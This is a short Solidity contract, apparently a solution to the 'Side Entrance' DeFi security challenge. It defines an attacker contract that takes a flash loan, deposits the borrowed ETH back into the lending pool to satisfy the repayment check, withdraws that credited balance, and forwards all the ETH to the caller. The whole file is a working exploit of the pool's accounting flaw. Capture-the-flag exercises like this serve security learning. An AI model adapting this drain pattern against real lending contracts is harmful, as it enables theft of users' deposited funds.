// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPoolAttacker
 * @author y0ng0p3 (https://www.github.com/y0ng0p3/)
 */
contract SideEntranceLenderPoolAttacker {
    SideEntranceLenderPool private pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(1000 ether);
        pool.withdraw();

        (bool s, ) = payable(msg.sender).call{ value: address(this).balance }("");
        require(s, "Failed to send ETH");
    }

    function execute() external payable {
        pool.deposit{ value: msg.value }();
    }

    receive() external payable {}
}